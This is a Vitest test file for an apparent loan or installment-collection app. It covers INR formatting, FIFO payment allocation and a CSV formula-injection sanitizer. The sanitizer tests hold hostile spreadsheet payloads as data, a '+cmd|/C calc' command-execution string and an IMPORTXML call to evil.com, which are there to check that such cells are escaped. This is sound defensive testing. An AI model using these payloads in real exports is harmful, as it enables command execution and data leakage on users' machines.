import { describe, it, expect } from 'vitest';
import { formatINR, formatINRDecimals, formatDate } from '../utils/formatters';

// CSV Formula Injection Sanitizer (matching ReportsPage & ImportPage)
function sanitizeCsvCell(val: any): string {
  if (val === null || val === undefined) return '""';
  let str = String(val).trim();
  if (/^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  return `"${str.replace(/"/g, '""')}"`;
}

// Mobile Collection FIFO allocation simulator (matching CollectPage)
interface PendingInstallment {
  installmentId: string;
  monthNumber: number;
  dueAmount: number;
}

function calculateInstallmentAllocations(
  paymentAmount: number,
  pendingInstallments: PendingInstallment[],
) {
  if (paymentAmount <= 0) return { allocations: [], unallocated: 0, totalAllocated: 0 };

  let remaining = paymentAmount;
  const allocations: { installmentId: string; allocatedAmount: number; remainingDue: number }[] = [];

  for (const inst of pendingInstallments) {
    if (remaining <= 0) break;
    const allocate = Math.min(remaining, inst.dueAmount);
    allocations.push({
      installmentId: inst.installmentId,
      allocatedAmount: allocate,
      remainingDue: inst.dueAmount - allocate,
    });
    remaining -= allocate;
  }

  const totalAllocated = paymentAmount - remaining;
  return {
    allocations,
    unallocated: remaining,
    totalAllocated,
  };
}

describe('Financial Logic & Mobile Collection Validations', () => {
  describe('Currency & Localization Formatting (INR Asia/Kolkata)', () => {
    it('formats numbers to Indian Rupee currency standard', () => {
      expect(formatINR(0)).toBe('₹0');
      expect(formatINR(5000)).toMatch(/₹\s?5,000/);
      expect(formatINR(100000)).toMatch(/₹\s?1,00,000/);
      expect(formatINR(1000000)).toMatch(/₹\s?10,00,000/);
    });

    it('formats decimal precision accurately without floating point anomalies', () => {
      expect(formatINRDecimals(2500.5)).toMatch(/₹\s?2,500\.50/);
      expect(formatINRDecimals(null)).toBe('₹0.00');
      expect(formatINRDecimals(undefined)).toBe('₹0.00');
    });

    it('formats business dates gracefully', () => {
      expect(formatDate(null)).toBe('-');
      expect(formatDate(undefined)).toBe('-');
      expect(formatDate('2026-05-15')).toMatch(/15\s+(May|05)\s+2026/);
    });
  });

  describe('FIFO Installment Allocation Preview', () => {
    const installments: PendingInstallment[] = [
      { installmentId: 'inst-1', monthNumber: 1, dueAmount: 5000 },
      { installmentId: 'inst-2', monthNumber: 2, dueAmount: 5000 },
      { installmentId: 'inst-3', monthNumber: 3, dueAmount: 5000 },
    ];

    it('allocates partial amount to the earliest installment', () => {
      const result = calculateInstallmentAllocations(2000, installments);
      expect(result.allocations).toHaveLength(1);
      expect(result.allocations[0].installmentId).toBe('inst-1');
      expect(result.allocations[0].allocatedAmount).toBe(2000);
      expect(result.allocations[0].remainingDue).toBe(3000);
      expect(result.totalAllocated).toBe(2000);
      expect(result.unallocated).toBe(0);
    });

    it('allocates full amount to first installment and spills remainder to next installment', () => {
      const result = calculateInstallmentAllocations(7500, installments);
      expect(result.allocations).toHaveLength(2);
      expect(result.allocations[0].allocatedAmount).toBe(5000);
      expect(result.allocations[0].remainingDue).toBe(0);
      expect(result.allocations[1].allocatedAmount).toBe(2500);
      expect(result.allocations[1].remainingDue).toBe(2500);
      expect(result.totalAllocated).toBe(7500);
      expect(result.unallocated).toBe(0);
    });

    it('tracks unallocated balance if payment exceeds total pending dues', () => {
      const result = calculateInstallmentAllocations(20000, installments);
      expect(result.allocations).toHaveLength(3);
      expect(result.totalAllocated).toBe(15000);
      expect(result.unallocated).toBe(5000);
    });

    it('handles zero or negative payment gracefully', () => {
      const result = calculateInstallmentAllocations(0, installments);
      expect(result.allocations).toHaveLength(0);
      expect(result.totalAllocated).toBe(0);
      expect(result.unallocated).toBe(0);
    });
  });

  describe('CSV Export Formula Injection Security', () => {
    it('escapes dangerous spreadsheet calculation prefixes (=, +, -, @)', () => {
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
      expect(sanitizeCsvCell('+cmd|/C calc')).toBe('"\' +cmd|/C calc"'.replace(' ', ''));
      expect(sanitizeCsvCell('-100')).toBe('"\' -100"'.replace(' ', ''));
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe('"\'@IMPORTXML(""http://evil.com"")"');
    });

    it('preserves clean customer codes and text without alterations', () => {
      expect(sanitizeCsvCell('CUST-001')).toBe('"CUST-001"');
      expect(sanitizeCsvCell('Durga Devi')).toBe('"Durga Devi"');
      expect(sanitizeCsvCell(5000)).toBe('"5000"');
    });
  });
});
